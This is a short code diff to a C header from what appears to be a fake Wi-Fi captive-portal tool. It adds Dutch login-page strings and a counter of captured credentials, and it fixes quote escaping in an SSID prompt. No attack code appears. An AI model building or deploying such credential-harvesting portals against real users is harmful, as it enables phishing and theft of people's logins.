@@ -68,7 +68,7 @@
 #define LOGIN_MESSAGE "Log in om veilig te browsen."
 #define LOGIN_BUTTON "Verder"
 #define LOGIN_AFTER_MESSAGE "Gegevens worden gecontroleerd..."
-#define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,",[,,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
+#define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
 #endif
 
 int totalCapturedCredentials = 0;
